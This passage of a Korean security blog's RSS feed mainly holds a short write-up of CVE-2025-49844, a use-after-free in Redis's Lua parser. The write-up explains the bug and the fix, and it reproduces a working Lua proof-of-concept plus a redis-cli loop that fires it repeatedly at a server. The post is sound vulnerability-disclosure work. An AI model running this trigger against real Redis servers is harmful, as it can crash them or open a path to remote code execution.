&#xAE30;&#xB2A5;&#xB4E4;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xC880; &#xB354; &#xC904;&#xC774;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798;&#xB294; &#xC8FC;&#xAC04; &#xC0AC;&#xC6A9;&#xB7C9; Top 5 &#xC774;&#xB7F0; &#xC7AC;&#xBBF8;&#xC694;&#xC18C;&#xB3C4; &#xB123;&#xC73C;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;&#x2026; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD504;&#xB86C;&#xD504;&#xD305;&#xC744; &#xB9CE;&#xC774; &#xD574;&#xC57C;&#xD574;&#xC11C; &#xC77C;&#xB2E8;&#xC740; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>&#xADF8;&#xB798;&#xB3C4; 4&#xC2DC;&#xAC04; &#xC815;&#xB3C4; &#xC0BD;&#xC9C8;&#xD55C; &#xB05D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C; &#xBBF8;&#xCC9C;&#xD55C; &#xC6F9; &#xAC1C;&#xBC1C; &#xC2E4;&#xB825;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xAC1C;&#xBC1C;&#xD588;&#xB2E4;&#xBA74; 1&#xC8FC;&#xC77C;&#xC740; &#xAC78;&#xB838;&#xC744;&#xD150;&#xB370; &#xD655;&#xC2E4;&#xD788; &#xC694;&#xC998; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xAC8C; &#xD6E8;&#xC52C; &#xC774;&#xB4DD;&#xC778;&#xAC70; &#xAC19;&#xB124;&#xC694;.</p><p>&#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xAC1C;&#xBC1C;&#xAE30;&#xC640; &#xBC1C;&#xD45C; &#xD604;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xB610; &#xC5B4;&#xB5A4; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC;&#x2026; &#xADF8; &#xB54C;&#xAE4C;&#xC9C0; &#xC798; &#xC0B4;&#xC544;&#xC788;&#xB3C4;&#xB85D; &#xBE4C;&#xC5B4;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xBC14;&#xC774;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-49844 : Redis의 Lua 스크립트를 통한 Use After Free로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</link>
      <guid>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</guid>
      <pubDate>Wed, 29 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dwisiswant0/CVE-2025-49844&quot;&gt;http</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/dwisiswant0/CVE-2025-49844">https://github.com/dwisiswant0/CVE-2025-49844</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Redis server &#x2264; 8.2.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBE44;&#xC815;&#xD615; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C; Redis&#xC5D0;&#xC11C; UAF&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Redis&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xC704;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Lua 5.1&#xC744; &#xB0B4;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC77D;&#xC5B4; &#xB4E4;&#xC774;&#xB294; <code>luaY_parser()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>Lua&#xC5D0;&#xC11C;&#xB294; Lua &#xC2A4;&#xD0DD;&#xC744; &#xD1B5;&#xD574; &#xD568;&#xC218; &#xD638;&#xCD9C;, &#xC5F0;&#xC0B0;, &#xC9C0;&#xC5ED; &#xBCC0;&#xC218; &#xC800;&#xC7A5; &#xB4F1; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; C&#xC758; <code>malloc()</code>, <code>free()</code>&#xCC98;&#xB7FC; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; Lua&#xC5D0;&#xC11C;&#xB294; GC(Garbage Collector)&#xB97C; &#xD1B5;&#xD574; &#xB354; &#xC774;&#xC0C1; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xAC1D;&#xCCB4;(&#xBB38;&#xC790;&#xC5F4;, &#xD14C;&#xC774;&#xBE14; &#xB4F1;)&#xB97C; &#xCC3E;&#xC544; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xAC12;&#xC740; &#xACE0;&#xC815;(Pinning)&#xD558;&#xC5EC; GC&#xC5D0;&#xAC8C; &#xC54C;&#xB824;&#xC8FC;&#xBA74;, GC&#xB294; &#xD574;&#xB2F9; &#xAC12;&#xC744; &#xD574;&#xC81C;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">...luaX_setinput(L, &amp;lexstate, z, luaS_new(L, name));...</code></pre><p>&#xBB38;&#xC81C;&#xB294; <code>luaY_parser()</code>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xAC01; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xCCAD;&#xD06C; &#xC774;&#xB984; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xACE0;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; <code>luaY_parser()</code> &#xB0B4;&#xC5D0;&#xC11C;&#xB294; &#xCCAD;&#xD06C; &#xC774;&#xB984;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC;, &#xBCC4;&#xB3C4;&#xC758; &#xCCAD;&#xD06C; &#xACE0;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB54C;&#xBB38;&#xC5D0;, &#xACE0;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD574;&#xB2F9; &#xCCAD;&#xD06C;&#xB97C; GC&#xB294; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xD574;&#xC81C; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; <code>luaY_parser()</code>&#xAC00; &#xB2E4;&#xC2DC; &#xCC38;&#xC870;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA74; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>luaY_parser</code>&#xAC00; &#xD30C;&#xC2F1;&#xC744; &#xC644;&#xB8CC;&#xD558;&#xAE30; &#xC804;&#xC5D0; GC&#xB97C; &#xB450; &#xBC88; &#xC5F0;&#xC18D;&#xC73C;&#xB85C; &#xAC15;&#xC81C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;, &#xD30C;&#xC11C;&#xAC00; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xB97C; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C; &#xC2DC;&#xCF1C; UAF&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- CVE-2025-49844 repro: leverage GC during parsing to revive freed chunk name.</span><span class="hljs-comment">-- Keep the chunk large enough to hold onto GC-managed memory but avoid the</span><span class="hljs-comment">-- &quot;200 local variables&quot; compilation guard by filling it with comments.</span><span class="hljs-keyword">local</span> payload = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;-- whatthefuuuuuuuuuuuuuuck\n&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build_payload</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> <span class="hljs-built_in">lines</span> = {}<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">150</span> <span class="hljs-keyword">do</span><span class="hljs-built_in">lines</span>[i] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&apos;local v_%d = %d&apos;</span>, i, i)<span class="hljs-keyword">end</span><span class="hljs-built_in">lines</span>[#<span class="hljs-built_in">lines</span> + <span class="hljs-number">1</span>] = <span class="hljs-string">&apos;return 0&apos;</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(<span class="hljs-built_in">lines</span>, <span class="hljs-string">&apos;\n&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_chunk_name</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> p = newproxy(<span class="hljs-literal">true</span>)<span class="hljs-built_in">getmetatable</span>(p).<span class="hljs-built_in">__gc</span> = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><span class="hljs-comment">-- Re-enter the collector while luaY_parser still holds the name string</span><span class="hljs-built_in">collectgarbage</span>(<span class="hljs-string">&apos;collect&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">tostring</span>(p)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> source = build_payload()<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">2000</span> <span class="hljs-keyword">do</span><span class="hljs-keyword">local</span> fn, err = <span class="hljs-built_in">loadstring</span>(source, make_chunk_name())<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fn <span class="hljs-keyword">then</span><span class="hljs-keyword">return</span> { step = i, err = err }<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> i % <span class="hljs-number">64</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">then</span><span class="hljs-comment">-- Heap churn to encourage the collector to run during parsing</span><span class="hljs-keyword">local</span> junk = {}<span class="hljs-keyword">for</span> j = <span class="hljs-number">1</span>, <span class="hljs-number">256</span> <span class="hljs-keyword">do</span>junk[j] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;A&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;completed w/o immediate crash (sybau &amp; re-run to increase likelihood)&quot;</span></code></pre><p>&#xD574;&#xB2F9; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; redis-cli&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; UAF&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-keyword">while</span> redis-cli -h localhost -p 6379 --<span class="hljs-built_in">eval</span> CVE-2025-49844.lua &gt;/dev/null; <span class="hljs-keyword">do</span>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;.&apos;</span><span class="hljs-keyword">done</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Redis 8.2.2 &#xBC84;&#xC804;&#xC5D0; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0DD;&#xC131;&#xB41C; &#xCCAD;&#xD06C;&#xB97C; <code>setsvalue2s()</code>, <code>incr_top()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC784;&#xC744; &#xC54C;&#xB9AC;&#xBA70; &#xACE0;&#xC815; &#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. GC&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xC784;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xAE30;&#xC5D0; UAF &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">TString *tname = luaS_new(L, name);setsvalue2s(L, L-&gt;top, tname);incr_top(L);luaX_setinput(L, &amp;lexstate, z, tname);<span class="hljs-comment">--L-&gt;top;</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49844">https://nvd.nist.gov/vuln/detail/CVE-2025-49844</a></li><li><a href="https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua">https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Redis/">Redis</category>
      
      <category domain="https://hackyboiz.github.io/tags/redis-server/">redis-server</category>
      
      <category domain="https://hackyboiz.github.io/tags/Use-After-Free/">Use After Free</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
